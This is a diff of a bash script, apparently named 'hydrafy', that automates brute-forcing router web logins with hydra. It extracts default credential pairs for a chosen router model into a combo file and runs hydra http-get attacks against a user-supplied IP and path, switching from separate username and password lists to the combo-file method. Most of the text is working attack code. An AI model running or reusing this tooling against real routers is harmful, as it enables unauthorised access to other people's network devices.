@@ -70,12 +70,11 @@ function script_info--()
 ## Support for the Router Attack method is limited to browser-based http-get requests right now,
 ## Feel free to do the work for me, if your work is good....I'll implement it and give you credit
 
-## Currently implementing sort and uniq filtering on user.txt and pass.txt.  This significantly reduced the amount of wrong entries to the the usage of a user and a pass file versus the colon delimited combo method implemented via hydra -C which is currently broken.
+## A patched version of hydra has been included with the svn repo of hydrafy.  I included the original hydra.c file renamed to orig.hydra.c.orig for comparisons.  To compiled it do: tar xfzv hydra-7.1-src.tar.gz and drop into the directory, read the README and go from there.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## Hydra does not properly process a colon delimited file via the -C flag.  As an example use zyxel routers and watch the output of hydra, then compare against snakebite.txt.  This method has currently been suspended until a patch for hydra is released.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -173,9 +172,9 @@ function hydrafy--()
 {
 ip= ## Tgt address for hydra
 at= ## path for past root
-# grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt
-grep -i $ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
-grep -i $ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt
+grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt
+#grep -i $ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
+#grep -i $ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt
 
 echo -e "\033[1;36m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
@@ -186,7 +185,7 @@ http://example.com/index.asp
 http://192.168.1.1/index.asp
 ############################
 
-/index.asp will describe the ""path past root"""
+index.asp will describe the ""path past root"""
 echo -e "\033[1;36m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 while [ -z $ip ];do
@@ -212,12 +211,12 @@ case $extend in
 done
 
 clear
-# hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
-hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
+hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
+#hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
 
 	no) clear
-# 	hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
- 	hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
+ 	hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
+# 	hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
 esac
 }
 
@@ -230,8 +229,8 @@ while getopts "f:r:" options; do
   esac
 done
 
-current_ver="0.5"
-rel_date="2 February 2012"
+current_ver="0.6"
+rel_date="4 February 2012"
 if [[ -n "$FILE" && -n "$ROUTER" ]]; then
 	menu--
 else
